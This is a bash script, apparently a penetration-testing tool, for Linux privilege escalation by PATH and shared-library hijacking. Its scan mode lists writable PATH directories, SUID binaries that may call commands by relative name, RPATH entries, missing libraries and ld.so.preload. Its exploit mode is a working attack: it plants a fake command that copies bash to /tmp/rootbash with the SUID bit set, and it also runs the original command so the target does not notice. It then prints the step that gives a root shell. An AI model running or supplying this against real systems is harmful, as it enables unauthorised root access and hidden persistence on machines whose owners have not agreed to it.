#!/bin/bash
# PATH Hijacking / Library Hijacking
# Usage: ./path_hijack.sh [--scan | --exploit <binary> <command>]

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

scan() {
    echo -e "${GREEN}=== PATH Hijacking Scan ===${NC}\n"

    # ── Writable PATH directories ──
    echo -e "${GREEN}--- Writable PATH Directories ---${NC}"
    echo -e "${YELLOW}[*] Current PATH: $PATH${NC}\n"
    IFS=':' read -ra PATHS <<< "$PATH"
    for p in "${PATHS[@]}"; do
        if [ -w "$p" ]; then
            echo -e "${RED}[!] WRITABLE: $p${NC}"
        fi
    done

    # ── SUID binaries calling relative commands ──
    echo -e "\n${GREEN}--- SUID Binaries with Relative Commands ---${NC}\n"
    SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null)
    for bin in $SUID_BINS; do
        # Check for relative command calls via strings
        RELATIVE_CMDS=$(strings "$bin" 2>/dev/null | grep -xP '[a-z][a-z0-9_-]+' | sort -u | head -20)
        for cmd in $RELATIVE_CMDS; do
            if which "$cmd" >/dev/null 2>&1; then
                # Verify it's called by checking common patterns
                if strings "$bin" 2>/dev/null | grep -qP "system\(|popen\(|exec[lv]p?\("; then
                    echo -e "${RED}[!] $bin may call '$cmd' relatively (has system/popen/exec)${NC}"
                fi
            fi
        done
    done

    # ── Scripts with relative commands run by root ──
    echo -e "\n${GREEN}--- Root-Owned Scripts with Relative Commands ---${NC}\n"
    for script in $(find /usr/local/bin /opt /usr/share -name '*.sh' -user root 2>/dev/null | head -20); do
        RELATIVE=$(grep -nP '^\s*[a-z][a-z0-9_-]+\s' "$script" 2>/dev/null | grep -v '^\s*#' | head -5)
        if [ -n "$RELATIVE" ]; then
            echo -e "${YELLOW}[*] $script — relative commands:${NC}"
            echo "$RELATIVE" | sed 's/^/    /'
        fi
    done

    # ── LD_LIBRARY_PATH abuse ──
    echo -e "\n${GREEN}--- Shared Library Hijacking ---${NC}\n"

    # Check for RPATH/RUNPATH in SUID binaries
    for bin in $SUID_BINS; do
        RPATH=$(readelf -d "$bin" 2>/dev/null | grep -iE 'RPATH|RUNPATH')
        if [ -n "$RPATH" ]; then
            echo -e "${RED}[!] $bin has RPATH/RUNPATH:${NC}"
            echo "    $RPATH"
            RPATH_DIR=$(echo "$RPATH" | grep -oP '\[.*?\]' | tr -d '[]')
            if [ -w "$RPATH_DIR" ]; then
                echo -e "${RED}    WRITABLE RPATH directory!${NC}"
            fi
        fi
    done

    # Missing shared libraries
    echo -e "\n${YELLOW}[*] Checking SUID binaries for missing shared libraries...${NC}"
    for bin in $(echo "$SUID_BINS" | head -20); do
        MISSING=$(ldd "$bin" 2>/dev/null | grep "not found")
        if [ -n "$MISSING" ]; then
            echo -e "${RED}[!] $bin — missing library:${NC}"
            echo "$MISSING" | sed 's/^/    /'
        fi
    done

    # ── LD_PRELOAD in /etc/ld.so.preload ──
    echo -e "\n${GREEN}--- LD_PRELOAD / ld.so.preload ---${NC}\n"
    if [ -f /etc/ld.so.preload ]; then
        echo -e "${YELLOW}[*] /etc/ld.so.preload exists:${NC}"
        cat /etc/ld.so.preload
        if [ -w /etc/ld.so.preload ]; then
            echo -e "${RED}[!] /etc/ld.so.preload is WRITABLE${NC}"
        fi
    fi
    if [ -w /etc ]; then
        echo -e "${RED}[!] /etc is writable — can create ld.so.preload${NC}"
    fi
}

exploit_path() {
    local TARGET_BIN="$1"
    local HIJACK_CMD="$2"

    if [ -z "$TARGET_BIN" ] || [ -z "$HIJACK_CMD" ]; then
        echo "Usage: $0 --exploit <suid_binary> <command_to_hijack>"
        echo "Example: $0 --exploit /usr/local/bin/suid-app service"
        exit 1
    fi

    echo -e "${GREEN}=== PATH Hijack Exploit ===${NC}\n"
    echo -e "${YELLOW}[*] Target: $TARGET_BIN${NC}"
    echo -e "${YELLOW}[*] Hijacking command: $HIJACK_CMD${NC}\n"

    # Create malicious binary
    TMPDIR=$(mktemp -d)
    cat > "$TMPDIR/$HIJACK_CMD" << 'PAYLOAD'
#!/bin/bash
# Copy bash and set SUID
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
# Also run original command to avoid suspicion
ORIG=$(which -a HIJACK_CMD 2>/dev/null | grep -v "^$0$" | head -1)
[ -n "$ORIG" ] && exec "$ORIG" "$@"
PAYLOAD
    sed -i "s/HIJACK_CMD/$HIJACK_CMD/g" "$TMPDIR/$HIJACK_CMD"
    chmod +x "$TMPDIR/$HIJACK_CMD"

    echo -e "${YELLOW}[*] Malicious $HIJACK_CMD created at $TMPDIR/$HIJACK_CMD${NC}"
    echo -e "${YELLOW}[*] Prepending to PATH and running target...${NC}\n"

    PATH="$TMPDIR:$PATH" "$TARGET_BIN" 2>/dev/null

    if [ -f /tmp/rootbash ] && [ -u /tmp/rootbash ]; then
        echo -e "${RED}[!] SUCCESS! SUID bash at /tmp/rootbash${NC}"
        echo -e "${YELLOW}[*] Run: /tmp/rootbash -p${NC}"
    else
        echo -e "${YELLOW}[*] Exploit may not have worked. Check if $TARGET_BIN calls $HIJACK_CMD.${NC}"
    fi

    rm -rf "$TMPDIR"
}

case "$1" in
    --exploit) exploit_path "$2" "$3" ;;
    *) scan ;;
esac
